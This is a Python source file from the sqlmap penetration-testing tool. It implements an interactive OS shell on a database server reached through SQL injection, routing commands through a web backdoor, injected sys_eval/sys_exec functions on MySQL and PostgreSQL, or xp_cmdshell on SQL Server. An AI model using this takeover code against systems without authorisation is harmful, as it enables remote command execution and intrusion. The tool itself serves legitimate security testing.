#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.common import dataToStdout
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.shell import autoCompletion
from lib.takeover.udf import UDF
from lib.takeover.web import Web
from lib.takeover.xp_cmdshell import xp_cmdshell

class Abstraction(Web, UDF, xp_cmdshell):
    """
    This class defines an abstraction layer for OS takeover functionalities
    to UDF / xp_cmdshell objects
    """

    def __init__(self):
        self.envInitialized = False
        self.alwaysRetrieveCmdOutput = False

        UDF.__init__(self)
        Web.__init__(self)
        xp_cmdshell.__init__(self)

    def execCmd(self, cmd, silent=False, forgeCmd=False):
        if self.webBackdoorUrl and not kb.stackedTest:
            self.webBackdoorRunCmd(cmd)

        elif kb.dbms in ( "MySQL", "PostgreSQL" ):
            self.udfExecCmd(cmd, silent=silent)

        elif kb.dbms == "Microsoft SQL Server":
            self.xpCmdshellExecCmd(cmd, silent, forgeCmd)

        else:
            errMsg = "Feature not yet implemented for the back-end DBMS"
            raise sqlmapUnsupportedFeatureException, errMsg

    def evalCmd(self, cmd, first=None, last=None):
        if self.webBackdoorUrl and not kb.stackedTest:
            return self.webBackdoorRunCmd(cmd)

        elif kb.dbms in ( "MySQL", "PostgreSQL" ):
            return self.udfEvalCmd(cmd, first, last)

        elif kb.dbms == "Microsoft SQL Server":
            return self.xpCmdshellEvalCmd(cmd, first, last)

        else:
            errMsg = "Feature not yet implemented for the back-end DBMS"
            raise sqlmapUnsupportedFeatureException, errMsg

    def runCmd(self, cmd):
        getOutput = None

        if not self.alwaysRetrieveCmdOutput:
            message   = "do you want to retrieve the command standard "
            message  += "output? [Y/n/a] "
            getOutput = readInput(message, default="Y")
            
            if getOutput in ("a", "A"):
                self.alwaysRetrieveCmdOutput = True

        if not getOutput or getOutput in ("y", "Y") or self.alwaysRetrieveCmdOutput:
            output = self.evalCmd(cmd)

            if output:
                conf.dumper.string("command standard output", output)
            else:
                dataToStdout("No output\n")
        else:
            self.execCmd(cmd, forgeCmd=True)

    def shell(self):
        if self.webBackdoorUrl and not kb.stackedTest:
            infoMsg  = "calling OS shell. To quit type "
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        else:
            if kb.dbms in ( "MySQL", "PostgreSQL" ):
                infoMsg  = "going to use injected sys_eval and sys_exec "
                infoMsg += "user-defined functions for operating system "
                infoMsg += "command execution"
                logger.info(infoMsg)

            elif kb.dbms == "Microsoft SQL Server":
                infoMsg  = "going to use xp_cmdshell extended procedure for "
                infoMsg += "operating system command execution"
                logger.info(infoMsg)

            else:
                errMsg = "feature not yet implemented for the back-end DBMS"
                raise sqlmapUnsupportedFeatureException, errMsg

            infoMsg  = "calling %s OS shell. To quit type " % kb.os or "Windows"
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        autoCompletion(osShell=True)

        while True:
            command = None

            try:
                command = raw_input("os-shell> ")
            except KeyboardInterrupt:
                print
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not command:
                continue

            if command.lower() in ( "x", "q", "exit", "quit" ):
                break

            self.runCmd(command)

    def initEnv(self, mandatory=True, detailed=False, web=False):
        if self.envInitialized:
            return

        if web:
            self.webInit()
        else:
            self.checkDbmsOs(detailed)

            if mandatory and not self.isDba():
                warnMsg  = "the functionality requested might not work because "
                warnMsg += "the session user is not a database administrator"
                logger.warn(warnMsg)

            if kb.dbms in ( "MySQL", "PostgreSQL" ):
                self.udfInjectSys()
            elif kb.dbms == "Microsoft SQL Server":
                if mandatory:
                    self.xpCmdshellInit()
            else:
                errMsg = "feature not yet implemented for the back-end DBMS"
                raise sqlmapUnsupportedFeatureException(errMsg)

        self.envInitialized = True
